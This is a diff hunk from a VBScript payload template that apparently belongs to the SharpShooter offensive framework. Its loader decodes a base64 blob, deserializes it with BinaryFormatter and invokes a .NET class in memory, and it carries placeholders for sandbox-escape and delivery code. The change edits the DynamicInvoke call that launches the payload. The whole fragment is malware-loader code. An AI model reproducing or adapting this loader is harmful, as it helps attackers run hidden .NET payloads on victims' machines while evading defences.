@@ -281,11 +281,8 @@ entry_class = "SharpShooter"
 
 Dim fmt, al, d, o
 Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
-Set al = CreateObject("System.Collections.ArrayList")
-al.Add fmt.SurrogateSelector
-
 Set d = fmt.Deserialize_2(Base64ToStream(s))
-Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
+Set o = d.DynamicInvoke(Nothing).CreateInstance(entry_class)
 
 %SANDBOX_ESCAPES%
 %DELIVERY%
